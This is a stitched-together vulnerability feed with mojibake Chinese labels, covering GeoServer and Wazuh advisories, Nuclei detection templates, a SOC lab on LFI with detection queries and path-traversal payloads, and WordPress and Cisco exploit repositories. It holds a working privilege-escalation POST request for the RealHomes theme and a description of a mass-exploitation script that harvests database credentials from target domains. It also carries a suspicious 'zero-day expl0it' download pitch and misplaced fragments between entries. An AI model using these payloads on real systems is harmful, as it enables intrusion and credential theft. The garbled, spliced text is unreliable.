posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Wazuh Web Interface ç‰ˆæœ¬æ£€æµ‹æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2024-57378 æ¼æ´ç±»å‹ï¼š ä¿¡æ¯æ³„éœ² æ¼æ´ç­‰çº§ï¼š ä¸­å± æ¼æ´æè¿°ï¼š è¯¥æ¼æ´æ¶‰åŠWazuh Web Interfaceçš„ç‰ˆæœ¬æ£€æµ‹é—®é¢˜ï¼Œé€šè¿‡ç‰¹å®šçš„Nuclei HTTPæ¨¡æ¿å¯ä»¥æ£€æµ‹ç›®æ ‡URLï¼ˆåŠå…¶/app/loginé¡µé¢ï¼‰æ˜¯å¦ä¸ºWazuh webç•Œé¢ï¼Œæå–wazuhVersionå€¼ï¼Œå¹¶ç¡®è®¤é¡µé¢å¯è®¿é—®ï¼ˆ200çŠ¶æ€ï¼‰ä¸”ç¡®å®æ˜¯Wazuh UIï¼ˆé€šè¿‡æ ‡é¢˜å’Œå…³é”®è¯åŒ¹é…ï¼‰ã€‚å¦‚æœæå–çš„ç‰ˆæœ¬ä¸º4.8.2ï¼ŒNucleiä¼šæŠ¥å‘ŠåŒ¹é…ã€‚ äº§å“å‚å•†ï¼š Wazuh äº§å“åç§°ï¼š Wazuh Web Interface å½±å“ç‰ˆæœ¬ï¼š 4.8.2 æ¥æºï¼š https://github.com/rxerium/CVE-2024-57378 ç±»å‹ï¼š CVE-2024:github search ä»“åº“æ–‡ä»¶ CVE-2024-57378.yaml README.md æ¥æºæ¦‚è¿°CVE-2024-57378How does this detection method work?This Nuclei HTTP template checks a target URL (and its /app/login page) for the Wazuh web interface, extracts the wazuhVersion value with a regex, and confirms the page is accessible (200 status) and actually a Wazuh UI (via title and keyword match). If the extracted version is 4.8.2, Nuclei reports a match How do I run this script? Download Nuclei from here Copy the template to your local system Run the following command: nuclei -u https://yourHost.com -t template.yaml References https://nvd.nist.gov/vuln/detail/CVE-2024-57378 DisclaimerUse at your own risk, I will not be responsible for illegal activities you conduct on infrastructure you do not own or have permission to scan. ContactFeel free to reach out to me on Signal.

posts.title: [XBOW-025-068] XML External Entity (XXE) Processing Vulnerability in GeoServer WFS Service
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-jj54-8f66-c5pc ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 8.2 å‚è€ƒé“¾æ¥ï¼š https://github.com/geonetwork/core-geonetwork/security/advisories/GHSA-2p76-gc46-5fvc https://github.com/geoserver/geoserver/security/advisories/GHSA-jj54-8f66-c5pc https://github.com/geotools/geotools/security/advisories/GHSA-826p-4gcg-35vw https://nvd.nist.gov/vuln/detail/CVE-2025-30220 https://github.com/geonetwork/core-geonetwork/pull/8757 https://github.com/geonetwork/core-geonetwork/pull/8803 https://github.com/geonetwork/core-geonetwork/pull/8812 https://docs.geoserver.org/latest/en/user/production/config.html#production-config-external-entities https://github.com/advisories/GHSA-jj54-8f66-c5pc æè¿°ï¼š SummaryGeoServer Web Feature Service (WFS) web service was found to be vulnerable to GeoTools CVE-2025-30220 XML External Entity (XXE) processing attack. It is possible to trigger the parsing of external DTDs and entities, bypassing standard entity resolvers. This allows for Out-of-Band (OOB) data exfiltration of local files accessible by the GeoServer process, and Service Side Request Forgery (SSRF). DetailsWhile direct entity resolution is managed by application property ENTITY_RESOLUTION_ALLOWLIST for XML Parsing, this restriction was not being used by the GeoTools library when building an in-memory XSD Library Schema representation. This bypasses GeoServerâ€™s AllowListEntityResolver enabling XXE attacks. PoCNo public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS service. Impact Information Disclosure: This vulnerability allows unauthenticated attackers to read arbitrary files from the serverâ€™s filesystem that are accessible to the GeoServer process. This can lead to exposure of sensitive information including configuration files, credentials, and system files. The attack can be performed remotely without authentication, making it particularly severe. Server-Side Request Forgery (SSRF) The mechanism inherently allows forcing GeoServer to make HTTP requests to arbitrary URLs, enabling SSRF attacks against internal network resources References CVE-2025-30220 XML External Entity (XXE) Processing Vulnerability in XSD schema handling External Entities Resolution (GeoServer User Manual) AcknowledgementsThis vulnerability was initially reported via an automated tool described below. Subsequently a duplicate report via @YacineF, and their patience working with the GeoServer project, was instrumental finding in escalating this issue and determining a resolution. XBOW-025-068 DisclaimerThis vulnerability was detected using XBOW, a system that autonomously finds and exploits potential security vulnerabilities. The finding has been thoroughly reviewed and validated by a security researcher before submission. While XBOW is intended to work autonomously, during its development human experts ensure the accuracy and relevance of its reports.

posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-68cf-j696-wvv9 ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 7.5 å‚è€ƒé“¾æ¥ï¼š https://github.com/geoserver/geoserver/security/advisories/GHSA-5gw5-jccf-6hxw https://github.com/geoserver/geoserver/security/advisories/GHSA-68cf-j696-wvv9 https://github.com/advisories/GHSA-68cf-j696-wvv9 æè¿°ï¼š SummaryMissing checks allow for SSRF to specific targets using the TestWfsPost enpoint. MitigationTo manage the proxy base value as a system administrator, use the parameter PROXY_BASE_URL to provide a non-empty value that cannot be overridden by the user interface or incoming request.thomsmith. ResolutionThe TestWfsPost has been replaced in GeoServer 2.25.2 and GeoServer 2.24.4 with a JavaScript Demo Requests page to test OGC Web Services. This allows an unauthenticated remote attacker to extract valid credentials and escalate privileges across different deployments Find the expl0it in CVE-2025-20286.py

posts.title: GeoServer Missing Authorization on REST API Index
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-h86g-x8mm-78m5 ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 5.3 å‚è€ƒé“¾æ¥ï¼š https://github.com/geoserver/geoserver/security/advisories/GHSA-h86g-x8mm-78m5 https://nvd.nist.gov/vuln/detail/CVE-2025-27505 https://github.com/geoserver/geoserver/pull/8170 https://osgeo-org.atlassian.net/browse/GEOS-11664 https://osgeo-org.atlassian.net/browse/GEOS-11776 https://github.com/advisories/GHSA-h86g-x8mm-78m5 æè¿°ï¼š SummaryIt is possible to bypass the default REST API security and access the index page. DetailsThe REST API security handles rest and its subpaths but not rest with an extension (e.g., rest.html). ImpactThe REST API index can disclose whether certain extensions are installed. WorkaroundIn ${GEOSERVER_DATA_DIR}/security/config.xml, change the paths for the rest filter to /rest.*,/rest/** and change the paths for the gwc filter to /gwc/rest.*,/gwc/rest/** and restart GeoServer. Referenceshttps://osgeo-org.atlassian.net/browse/GEOS-11664https://osgeo-org.atlassian.net/browse/GEOS-11776https://github.com/geoserver/geoserver/pull/8170

posts.title: Wazuh ååºåˆ—åŒ–æ¼æ´
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Wazuh ååºåˆ—åŒ–æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-24016 æ¼æ´ç±»å‹ï¼š ååºåˆ—åŒ– æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Wazuhè½¯ä»¶ä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„æ•°æ®å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å—å½±å“ç‰ˆæœ¬ä¸º4.4.0è‡³4.9.0ã€‚ äº§å“å‚å•†ï¼š Wazuh äº§å“åç§°ï¼š Wazuh å½±å“ç‰ˆæœ¬ï¼š 4.4.0 <= version <= 4.9.0 æ¥æºï¼š https://github.com/rxerium/CVE-2025-24016 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ CVE-2025-24016.yaml README.md æ¥æºæ¦‚è¿°CVE-2025-24016How does this detection method work?This Nuclei HTTP template checks a target URL (and its /app/login page) for the Wazuh web interface, extracts the wazuhVersion value with a regex, and confirms the page is accessible (200 status) and actually a Wazuh UI (via title and keyword match). If the extracted version sits between 4.4.0 and 4.9.0 (the vulnerable range for CVE-2025-24016), Nuclei reports a critical finding, signalling that unsafe deserialisation could allow remote code execution. How do I run this script? Download Nuclei from here Copy the template to your local system Run the following command: nuclei -u https://yourHost.com -t template.yaml References https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh https://www.cisa.gov/known-exploited-vulnerabilities-catalog https://www.cve.org/CVERecord?id=CVE-2025-24016 DisclaimerUse at your own risk, I will not be responsible for illegal activities you conduct on infrastructure you do not own or have permission to scan. ContactFeel free to reach out to me on Signal.

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š WordPress RealHomes Theme æƒé™æå‡æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-4601 æ¼æ´ç±»å‹ï¼š æƒé™æå‡ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š WordPressä¸»é¢˜RealHomesç‰ˆæœ¬<=4.4.0å­˜åœ¨æƒé™æå‡æ¼æ´ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·ï¼ˆå¦‚è®¢é˜…è€…ï¼‰é€šè¿‡inspiry_update_profileåŠŸèƒ½æå‡è‡³ç®¡ç†å‘˜æƒé™ã€‚æ”»å‡»è€…å¯é€šè¿‡å‘admin-ajax.phpç«¯ç‚¹å‘é€ç‰¹åˆ¶çš„POSTè¯·æ±‚ï¼Œè®¾ç½®realhomes_user_roleå‚æ•°ä¸ºadministratoræ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æ­¤æ¼æ´éœ€è¦ere_allow_users_change_roleé€‰é¡¹å¯ç”¨ã€‚æˆåŠŸåˆ©ç”¨åï¼Œæ”»å‡»è€…å¯è·å¾—å®Œå…¨çš„ç®¡ç†å‘˜æƒé™ï¼Œå¯èƒ½å¯¼è‡´ç½‘ç«™è¢«å®Œå…¨æ§åˆ¶ã€‚ äº§å“å‚å•†ï¼š WordPress äº§å“åç§°ï¼š RealHomes å½±å“ç‰ˆæœ¬ï¼š <= 4.4.0 æ¥æºï¼š https://github.com/Yucaerin/CVE-2025-4601 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ README.md æ¥æºæ¦‚è¿°CVE-2025-4601 - WordPress RealHomes Theme <= 4.4.0 - Privilege EscalationğŸ”¥ Vulnerability SummaryThe WordPress theme RealHomes versions <= 4.4.0 is vulnerable to a privilege escalation vulnerability. This allows authenticated users with low privileges (such as subscribers) to escalate their roles to administrators. This vulnerability occurs through the inspiry_update_profile function, which improperly allows users to change their role if the ere_allow_users_change_role option is enabled. This issue can be exploited by submitting a specially crafted POST request to the admin-ajax.php endpoint, providing the realhomes_user_role parameter set to administrator. ğŸ” Affected Theme Theme Name: RealHomes Affected Version: <= 4.4.0 Vulnerability Type: Privilege Escalation CVE ID: CVE-2025-4601 CVSS Score: 8.8 (Critical) Impact: Full Administrative Access â†’ Potential Site Compromise ğŸ§ª Exploit Features ğŸ“¥ Fetches nonce automatically from the target page. ğŸ” Escalates user role to administrator via the realhomes_user_role parameter. ğŸŒ No authentication required beyond being logged in as a low-privileged user (e.g., subscriber). ğŸ’¾ Updates user profile, granting administrative access to the attacker. ğŸ§  Researcher Credit: Thai An ğŸš€ Usage Login to the target website as a low-privileged user (e.g., subscriber). Access the /wp-admin/admin-ajax.php endpoint with the following POST data, which includes the realhomes_user_role set to administrator: 123456789101112131415161718POST /wp-admin/admin-ajax.php HTTP/2Host: targetsite.comCookie: wordpress_logged_in_xxx=...Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNGw1yuikHiYVYYsr------WebKitFormBoundaryNGw1yuikHiYVYYsrContent-Disposition: form-data; name="first-name"test------WebKitFormBoundaryNGw1yuikHiYVYYsrContent-Disposition: form-data; name="last-name"user------WebKitFormBoundaryNGw1yuikHiYVYYsrContent-Disposition: form-data; name="realhomes_user_role"administrator------WebKitFormBoundaryNGw1yuikHiYVYYsrContent-Disposition: form-data; name="action"inspiry_update_profile------WebKitFormBoundaryNGw1yuikHiYVYYsr-- Check the response: If the request is successful, the attacker will gain administrative access. Verify by accessing the /wp-admin/ page to confirm if the attacker has been granted admin privileges. ğŸ”’ Disclaimer:This is intended for educational purposes only and should only be used on systems you own or are explicitly authorized to test. Misuse of this code may lead to legal consequences.

posts.title: GeoServer Vulnerable to Unauthenticated SSRF via TestWfsPost
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-5gw5-jccf-6hxw ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 7.5 å‚è€ƒé“¾æ¥ï¼š https://github.com/geoserver/geoserver/security/advisories/GHSA-5gw5-jccf-6hxw https://nvd.nist.gov/vuln/detail/CVE-2021-40822 https://osgeo-org.atlassian.net/browse/GEOS-11390 https://osgeo-org.atlassian.net/browse/GEOS-11794 https://github.com/advisories/GHSA-5gw5-jccf-6hxw æè¿°ï¼š SummaryIt possible to achieve Service Side Request Forgery (SSRF) via the Demo request endpoint if Proxy Base URL has not been set. DetailsA unauthenticated user can supply a request that will be issued by the server. This can be used to enumerate internal networks and also in the case of cloud instances can be used to obtain sensitive data. Mitigation When using GeoServer with a proxy, manage the proxy base value as a system administrator, use the application property PROXY_BASE_URL to provide a non-empty value that cannot be overridden by the user interface or incoming request. When using GeoServer directly without a proxy, block all access to TestWfsPost by editing the web.xml file. Adding this block right before the end: 123456789<security-constraint> <web-resource-collection> <web-resource-name>BlockDemoRequests</web-resource-name> <url-pattern>/TestWfsPost/*</url-pattern> </web-resource-collection> <auth-constraint> <role-name>BLOCKED</role-name> </auth-constraint> </security-constraint> ResolutionUpgrading to GeoServer 2.24.4, or 2.25.2, removes the TestWfsPost servlet resolving this issue. The demo request page functionality is now implemented directly in the browser. Reference https://osgeo-org.atlassian.net/browse/GEOS-11794 https://osgeo-org.atlassian.net/browse/GEOS-11390 https://nvd.nist.gov/vuln/detail/CVE-2021-40822

posts.title: GeoServer has improper ENTITY_RESOLUTION_ALLOWLIST URI validation in XML Processing (SSRF)
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-mc43-4fqr-c965 ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 9.3 å‚è€ƒé“¾æ¥ï¼š https://github.com/geoserver/geoserver/security/advisories/GHSA-mc43-4fqr-c965 https://docs.geoserver.org/latest/en/user/production/config.html#production-config-external-entities https://github.com/advisories/GHSA-mc43-4fqr-c965 æè¿°ï¼š SummaryAn improper URI validation vulnerability exists that enables an unauthorized attacker to perform XML External Entities (XEE) attack, then send GET request to any HTTP server. Attacker can abuse this to scan internal networks and gain information about them then exploit further. Moreover, attacker can read limited .xsd file on system. DetailsBy default, GeoServer use PreventLocalEntityResolver class from GeoTools to filter out malicious URIs in XML entities before resolving them. The URI must match the regex (?i)(jar:file|http|vfs)[^?#;]*\\.xsd. But the regex leaves a chance for attackers to request to any HTTP server or limited file. ImpactAn unauthenticated attacker can: Scan internal network to gain insight about it and exploit further. SSRF to endpoint ends with .xsd. Read limited .xsd file on system. Mitigation Define the system property ENTITY_RESOLUTION_ALLOWLIST to limit the supported external schema locaitons. The built-in allow list covers the locations required for the operation of OGC web services: www.w3.org,schemas.opengis.net,www.opengis.net,inspire.ec.europa.eu/schemas. The user guide provides details on how to add additional locations (this is required for app-schema plugin where a schema is supplied to define an output format). Resolution GeoServer 2.25.0 and greater default to the use of ENTITY_RESOLUTION_ALLOWLIST and does not require you to provide a system property. The use of ENTITY_RESOLUTION_ALLOWLIST is still supported if you require additional schema locations to be supported beyond the built-in allow list. GeoServer 2.25.1 change ENTITY_RESOLUTION_ALLOWLIST no longer supports regular expressions References External Entities Resolution (GeoServer User Guide) Credits Le Mau Anh Phong from VNG Security Response Center & VNUHCM - University of Information Technology

posts.title: GWC Home Page communicate version and revision information
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-jm79-7xhw-6f6f ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 5.3 å‚è€ƒé“¾æ¥ï¼š https://github.com/geoserver/geoserver/security/advisories/GHSA-jm79-7xhw-6f6f https://github.com/GeoWebCache/geowebcache/issues/1344 https://github.com/GeoWebCache/geowebcache/pull/1345 https://github.com/geoserver/geoserver/pull/8189 https://osgeo-org.atlassian.net/browse/GEOS-11677 https://github.com/advisories/GHSA-jm79-7xhw-6f6f æè¿°ï¼š SummaryThe GeoWebCache home page includes version and revision information about the software in use. This information is sensitive from a security point of view because it allows software used by the server to be easily identified. Detailsorg.geowebcache.GeoWebCacheDispatcher.handleFrontPage(HttpServletRequest, HttpServletResponse) has no check to hide potentially sensitive information from users except for a hidden system property to hide the storage locations that defaults to showing the locations. PoCJust open http://localhost:8080/geoserver/gwc/ ImpactIn addition to exposing the version and revision information, the home page will expose the config file and storage locations which may expose the systemâ€™s temp directory location and whether or not GeoServer is running in a Windows operating system. The approximate server start time and some basic GWC usage information is also exposed. Referenceshttps://osgeo-org.atlassian.net/browse/GEOS-11677https://github.com/geoserver/geoserver/pull/8189https://github.com/GeoWebCache/geowebcache/issues/1344https://github.com/GeoWebCache/geowebcache/pull/1345

posts.title: Coverage REST API Server Side Request Forgery
posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-r4hf-r8gj-jgw2 ä»“åº“ Starï¼š 4052 CVSS è¯„åˆ†ï¼š 5.5 å‚è€ƒé“¾æ¥ï¼š https://github.com/geoserver/geoserver/security/advisories/GHSA-r4hf-r8gj-jgw2 https://osgeo-org.atlassian.net/browse/GEOS-11468 https://osgeo-org.atlassian.net/browse/GEOS-11717 https://github.com/advisories/GHSA-r4hf-r8gj-jgw2 æè¿°ï¼š SummaryThe Coverage rest api /workspaces/{workspaceName}/coveragestores/{storeName}/{method}.{format} allow to upload file with a specified url (with {method} equals â€˜urlâ€™) with no restrict. DetailsThe Coverage rest api /workspaces/{workspaceName}/coveragestores/{storeName}/{method}.{format} allow to upload file with a specified url (with {method} equals â€˜urlâ€™). But this url has not been check with URL Checks feature. For example, should add the code below to check fileURL: 1URLCheckers.confirm(fileURL) The vulnerable code was RESTUtils.java ImpactThis vulnerability presents the opportunity for Server Side Request Forgery. References https://osgeo-org.atlassian.net/browse/GEOS-11468 https://osgeo-org.atlassian.net/browse/GEOS-11717

posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š WordPress Nasa Core Plugin æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-39507 æ¼æ´ç±»å‹ï¼š æ–‡ä»¶åŒ…å« æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š WordPressçš„Nasa Coreæ’ä»¶ï¼ˆç‰ˆæœ¬6.3.2åŠä»¥ä¸‹ï¼‰å­˜åœ¨ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCVE-2025-39507ï¼‰ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ“çºµæ–‡ä»¶è¾“å…¥å‚æ•°æ¥è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡æ„é€ ç‰¹å®šçš„URLè·¯å¾„ï¼ˆå¦‚/index.php?file=../../../../etc/passwdï¼‰æ¥å°è¯•è¯»å–ç³»ç»Ÿæ–‡ä»¶ã€‚è¯¥æ¼æ´æºäºæ’ä»¶æœªèƒ½æ­£ç¡®éªŒè¯æ–‡ä»¶è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æŒ‡å®šä»»æ„è·¯å¾„è¿›è¡Œæ–‡ä»¶åŒ…å«æ“ä½œã€‚ äº§å“å‚å•†ï¼š WordPress äº§å“åç§°ï¼š Nasa Core Plugin å½±å“ç‰ˆæœ¬ï¼š <= 6.3.2 æ¥æºï¼š https://github.com/blackgirlinfosec/cve-lfi-lab ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ README.md åŸå§‹ä¿¡æ¯ğŸ§  CVE Lab: Tier 1 SOC Analyst SimulationCVE-2025-39507 | Local File Inclusion in WordPress Nasa Core Plugin ğŸ“ Scenario: A Day in the SOCItâ€™s a regular Monday. Iâ€™m logged into the SOC dashboard, reviewing alerts like usual. One comes in that catches my eye: ALERT: Possible Local File Inclusion (LFI) AttemptIP Address: 203.0.113.44URL: /index.php?file=../../../../etc/passwdUser Agent: curl/7.81.0 It looks like someone might be trying to access system files by manipulating a URL. My job is to look into it and decide if this needs to be escalated. ğŸ” Background on the CVEAfter some quick research, I found this matches a known vulnerability: CVE-2025-39507. It affects a WordPress plugin called Nasa Core (version 6.3.2 and below). It allows attackers to view sensitive files on the server by changing a file input parameter. Example: 1/index.php?file=../../../../etc/passwd If the plugin doesnâ€™t validate the file input correctly, itâ€™ll just follow whatever path the attacker gives it. ğŸ› ï¸ My Tier 1 Investigation1. Checked the Alert in SentinelI didnâ€™t write the detection rule, but I reviewed it to understand what triggered the alert. It looks for things like: URLs with â€œ../â€ (path traversal) Requests to sensitive files like /etc/passwd or /wp-config.php Scripts or tools in the user agent (like curl or Python) Hereâ€™s a simplified version of the rule: 123456CommonSecurityLog| where RequestURL has "../" or RequestURL has "etc/passwd" or RequestURL has "wp-config"| where DeviceCustomString1 contains "curl" or DeviceCustomString1 contains "python"| project TimeGenerated, SourceIP, RequestURL, DeviceCustomString1 2. Looked Up the IP AddressI ran a query to see if the IP 203.0.113.44 was trying anything else: 123CommonSecurityLog| where SourceIP == "203.0.113.44"| summarize count() by RequestURL Turns out, it also hit other paths like /admin/, /login.php, and /wp-config.php. That told me this wasnâ€™t just a one-time request â€” it was probably a scanner or someone doing recon. 3. Checked the TimelineI checked how long the IP had been active in our logs: 123CommonSecurityLog| where SourceIP == "203.0.113.44"| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated) It started a few hours ago and was still active recently. So it wasnâ€™t historical noise â€” this was ongoing. 4. Escalated to Tier 2Hereâ€™s how I documented it for escalation: â€œPossible LFI scan from IP 203.0.113.44. The request pattern matches CVE-2025-39507. IP accessed 9 unique paths including /etc/passwd and wp-config.php using curl. Behavior suggests automated recon. Recommend Tier 2 review and possible IP block.â€ ğŸ“¸ Screenshots # Description File 1 CVE Listing (Patchstack) 1_cve_selection_listing.png 2 Patchstack Overview 2_patchstack_cve_overview.png 3 VulDB Vector Example 3_vuldb_exploit_vector.png 4 Azure Kali VM Created 4_kali_vm_deployed.png 5 VM Running Screenshot 5_kali_vm_running_status.png 6 SSH Access to Kali 6_kali_vm_logged_in.png 7 Sentinel KQL Rule Review 7_lfi_detection_kql_query.png All screenshots are located in the /screenshots folder. ğŸ” ReflectionSome questions I asked myself as I worked through this: What signs in the logs made this alert stand out? How can I tell if this is just a scanner or something more serious? What else might happen if this LFI attack actually succeeded? Whatâ€™s the right balance between alert fatigue and escalation? ğŸ”œ Whatâ€™s Next â€“ Phase 2Next, Iâ€™ll run a safe simulation of this attack in a controlled lab environment using a platform like TryHackMe. The goal is to better understand what this type of activity looks like from the attackerâ€™s side â€” and what kind of logs it creates. âš ï¸ DisclaimerThis lab was done in a safe, ethical environment for training purposes only. No real systems were targeted or harmed. Always follow your organizationâ€™s rules and never test exploits on systems you donâ€™t own or have permission to test.

posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š WordPress File Away ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-2539 æ¼æ´ç±»å‹ï¼š æ–‡ä»¶è¯»å– æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š WordPressæ’ä»¶File Awayç‰ˆæœ¬<=3.9.9.0.1å­˜åœ¨æœªè®¤è¯çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘æ’ä»¶çš„AJAXç«¯ç‚¹å‘é€ç‰¹åˆ¶è¯·æ±‚æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„ä»»ä½•æ–‡ä»¶ï¼Œå¦‚wp-config.phpã€‚æ¼æ´æºäºä½¿ç”¨fileaway-statsåŠ¨ä½œé€šè¿‡admin-ajax.phpæ—¶çš„ä¸å½“nonceéªŒè¯å’Œè·¯å¾„é™åˆ¶ç¼ºå¤±ã€‚æ”»å‡»è€…å¯åˆ©ç”¨æ­¤æ¼æ´æ£€ç´¢æ•æ„Ÿæ–‡ä»¶å¹¶æå–å‡­è¯ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨å¦¥åã€‚ äº§å“å‚å•†ï¼š WordPress äº§å“åç§°ï¼š File Away å½±å“ç‰ˆæœ¬ï¼š <= 3.9.9.0.1 æ¥æºï¼š https://github.com/Yucaerin/CVE-2025-2539 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ mass_cve_2539.py readme.md åŸå§‹ä¿¡æ¯CVE-2025-2539 - WordPress File Away <= 3.9.9.0.1 - Arbitrary File ReadğŸ”¥ Vulnerability SummaryThe WordPress plugin File Away version <= 3.9.9.0.1 is vulnerable to an unauthenticated arbitrary file read vulnerability.This allows attackers to read any file on the server, such as wp-config.php, through a crafted request to the pluginâ€™s AJAX endpoint. The vulnerability stems from improper nonce validation and lack of path restriction when using the fileaway-stats action via admin-ajax.php.Attackers can leverage this to retrieve sensitive files and extract credentials, potentially leading to full compromise. ğŸ” Affected Plugin Plugin Name: File Away Affected Version: <= 3.9.9.0.1 Vulnerability Type: Unauthenticated Arbitrary File Read CVE ID: CVE-2025-2539 CVSS Score: 9.1 (Critical) Impact: Sensitive Information Disclosure â†’ Potential RCE (via DB creds + upload) ğŸ§ª Exploit Features ğŸ“¥ Fetches nonce automatically from the target page ğŸ“„ Reads arbitrary file (e.g., wp-config.php) ğŸ” Extracts DB credentials (DB_USER, DB_PASSWORD, DB_HOST) âœ… Validates access to /phpmyadmin or /phpMyAdmin ğŸŒ Attempts remote DB login using retrieved credentials ğŸ’¾ Stores valid credentials and phpMyAdmin access in: result_database.txt result_phpmyadmin_dan_config_valid.txt result_databaseremotevalid.txt ğŸ§  ResearcherCredit: https://github.com/RootHarpy/CVE-2025-2539 ğŸš€ UsagePrepare your list.txt file with a list of target domains (one per line, without http or https). Example list.txt: 123example.com victimsite.org target123.net Run the script: 1python3 mass_cve_2539.py ğŸ“ Output result_database.txt â†’ List of extracted DB credentials result_phpmyadmin_and_config_valid.txt â†’ List of phpMyAdmin URLs found result_databaseremotevalid.txt â†’ List of valid remote DB credentials ğŸ”’ Disclaimer:This tool is intended for educational purposes only and should only be used on systems you own or are explicitly authorized to test. Misuse of this code may lead to legal consequences.

posts.text: æ¼æ´ä¿¡æ¯ æ³¨: æœ¬æ¨¡å—æ¥è‡ª AI å¯èƒ½å­˜åœ¨é”™è¯¯ æ¼æ´åç§°ï¼š Cisco ISE Cloud Credential Sharing Vulnerability æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-20286 æ¼æ´ç±»å‹ï¼š ä¿¡æ¯æ³„éœ² æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Cisco ISEäº‘éƒ¨ç½²åœ¨AWSã€Microsoft Azureå’ŒOracle Cloud Infrastructure (OCI)ä¸Šå­˜åœ¨ä¸€ä¸ªä¸¥é‡çš„å‡­è¯ç”Ÿæˆå’Œæˆæƒé€»è¾‘ç¼ºé™·ï¼Œå¯¼è‡´ä½¿ç”¨ç›¸åŒè½¯ä»¶ç‰ˆæœ¬çš„äº‘éƒ¨ç½²å…±äº«ç›¸åŒçš„å‡­è¯ã€‚è¿™ä½¿å¾—æœªç»è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…èƒ½å¤Ÿæå–æœ‰æ•ˆå‡­è¯å¹¶åœ¨ä¸åŒéƒ¨ç½²é—´æå‡æƒé™ã€‚ äº§å“å‚å•†ï¼š Cisco äº§å“åç§°ï¼š Cisco Identity Services Engine (ISE) æ¥æºï¼š https://github.com/amandanegefa/CVE-2025-20286 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ README.md åŸå§‹ä¿¡æ¯Zero-Day Expl0it for Cisco ISE Cloud Credential Sharing Vulnerability (CVE-2025-20286) All materials included in this repository are collected from publicly available sources. Severity: Critical (CVSS 9.9) Affected Platforms: Cisco Identity Services Engine (ISE) cloud deployments on AWS, Microsoft Azure, and Oracle Cloud Infrastructure (OCI) Vulnerability Description:A critical flaw in the credential generation and authorization logic causes multiple Cisco ISE cloud deployments to share identical credentials when using the same software release on the same cloud platform. This allows an unauthenticated remote attacker to extract valid credentials and escalate privileges across different deployments. Expl0it Capabilities: Remote credential disclosure Limited administrative operations System configuration modification Service disruption Exploitation Method: Network-based, no prior authentication needed Stability: Fully developed and tested expl0it with detailed deployment instructions Disclaimer: Intended for authorized research and penetration testing only; misuse prohibited This repository will be deleted. Download

Vulnerability CVSS: 9.8 (Critical) Type: Stack-based buffer overflow in AuthHash cookie processing Impact: Unauthenticated remote code execution Affected Products: FortiVoice, FortiMail, FortiNDR, FortiRecorder, FortiCamera The vulnerability exists in the processing of the enc parameter in the /remote/hostcheck_validate endpoint, where improper bounds checking allows buffer overflow. Use only against systems you own or have permission to test.

